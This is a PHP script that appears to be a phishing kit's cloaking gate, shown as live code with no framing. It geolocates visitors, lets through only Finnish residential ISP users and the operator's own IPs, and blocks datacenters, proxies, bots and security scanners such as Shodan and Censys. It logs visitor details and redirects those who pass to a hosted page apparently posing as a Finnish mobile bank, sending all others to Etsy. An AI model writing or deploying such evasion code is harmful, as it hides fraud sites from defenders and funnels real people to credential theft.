<?php
session_start();

function get_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ip_list[0]);
    }
    $h = ['HTTP_CF_CONNECTING_IP', 'REMOTE_ADDR'];
    foreach ($h as $k) { 
        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]); 
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = get_ip();  
$my_ips = ["85.83.92.81", "105.158.35.230", "160.177.134.224"]; 

// === [PLACE MANUEL] HNA TZID LES IPS LI BGHITI TBLOCKIHOM ===
$manual_blocked = [
    "62.192.154.50",
    "86.115.73.80"
];
// ========================================================

// --- [1] Vérification manuelle (qbel l'automatique) ---
if (in_array(trim($ip), $manual_blocked)) {
    $status = "Blocked (manual)";
    goto log_and_redirect;
}

if (!isset($_GET['check'])) {
    echo '<script>window.location.replace("gate.php?check=1&w="+window.screen.width+"&p="+navigator.platform);</script>';
    exit();
}

if (isset($_GET['check'])) {
    $status = "Blocked";
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $rdns = strtolower(@gethostbyaddr($ip));
    
    $res = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode,isp,org,as,hosting,proxy"));

    if ($res && $res->status == 'success') {

        if ($res->countryCode !== 'FI') {
            $status = "Blocked";
        } 
        else {
            $isp = strtolower($res->isp ?? '');
            $org = strtolower($res->org ?? '');
            $full_data = strtolower($isp . " " . $org . " " . ($res->as ?? '') . " " . $rdns);
            
            $blacklist = [
                'amazon', 'aws', 'google', 'facebook', 'microsoft', 'azure', 
                'digitalocean', 'ovh', 'hetzner', 'leaseweb', 'vultr', 'linode',
                'alibaba', 'tencent', 'bot', 'spider', 'crawl', 'scanner', 
                'shodan', 'censys', 'tor-exit', 'proxy', 'proxy solutions', 
                'datacenter', 'vps', 'cloud', 'server farm', 'hosting', 'host',
                'cache', 'Data', 'Data Center',
            ];

            $whitelist = [
                'elisa', 'elisa oyj', 'saunalahti', 'saunalahti serveri',
                'telia', 'telia finland', 'telia finland oyj', 'sonera', 
                'dna', 'dna oyj', 'dna network',
                'moi', 'moi mobiili', 'moi mobiili oy', 'alcom', 'åland', 'aland',
                'lounea', 'lounea palvelut', 'valoo', 'adula', 'kaisanet', 
                'jnt', 'jakobstads', 'pietarsaaren', 'blc', 'savonlinna', 
                'mpy', 'mpy telecom', 'mpy osuuskunta', 'karjaan puhelin', 
                'karis telefon', 'nevel', 'sunet', 'suupohjan', 'napapiiri', 
                'napapiirin kuituverkot', 'bni', 'blue fiber', 'laitilan', 
                'laitilan puhelin', 'vakka-suomen', 'pargas', 'paraisten',
                'fujitsu finland', 'softbank',
                'kymenlaakson', 'kymentaka', 'savon voima', 'oulun seudun',
                'nivaki', 'elpisa', 'fibe', 'kuitu', 'valokuitu',
                'starlink', 'spacex', 'spacex services'
            ];

            $is_bot = false;
            foreach($blacklist as $b) { 
                if (strpos($full_data, $b) !== false) { 
                    $is_bot = true; 
                    break; 
                } 
            }

            $has_whitelist = false;
            foreach($whitelist as $w) { 
                if (strpos($full_data, $w) !== false) { 
                    $has_whitelist = true; 
                    break; 
                } 
            }

            if (in_array(trim($ip), $my_ips)) {
                $status = "Passed";
            }
            else if ($has_whitelist && !$is_bot && !$res->proxy && $_GET['w'] > 100) {
                $status = "Passed";
            }
            else {
                $status = "Blocked";
            }
        }
    }

    $device = "Unknown";
    if (preg_match('/iPhone|iPad|iPod/i', $ua)) { $device = "iOS"; }
    elseif (preg_match('/Android/i', $ua)) { $device = "Android"; }
    elseif (preg_match('/Windows/i', $ua)) { $device = "Windows"; }
    elseif (preg_match('/Macintosh/i', $ua)) { $device = "MacBook"; }

    $browser = "Unknown";
    if (strpos($ua, 'Chrome') !== false) { $browser = "Chrome"; }
    elseif (strpos($ua, 'Safari') !== false) { $browser = "Safari"; }
    elseif (strpos($ua, 'Firefox') !== false) { $browser = "Firefox"; }

    $file = 'log.txt';
    $date = date("Y-m-d H:i:s");
    $country = $res->countryCode ?? '??';
    $isp_name = $res->isp ?? 'Unknown';
    $org_name = $res->org ?? 'Unknown';

    $lines = file_exists($file) ? file($file, FILE_IGNORE_NEW_LINES) : [];
    $found = false; 
    $new_content = [];

    foreach ($lines as $line) {
        if (empty($line)) continue;
        $parts = explode('|', $line);
        if ($parts[0] == $ip) {
            $parts[1] = $date;
            $parts[7] = $status;
            $parts[8] = intval($parts[8] ?? 1) + 1;
            $new_content[] = implode('|', $parts); 
            $found = true;
        } else { 
            $new_content[] = $line; 
        }
    }

    if (!$found) { 
        $new_content[] = "$ip|$date|$country|$isp_name|$org_name|$device|$browser|$status|1"; 
    }

    file_put_contents($file, implode("\n", $new_content) . "\n", LOCK_EX);
}

log_and_redirect:

if (isset($status) && strpos($status, 'Passed') !== false) {
    header("Location: https://smanak-production.up.railway.app/appspanakofimobiili");
    exit();
} else {
    header("Location: https://www.etsy.com");
    exit();
}
?>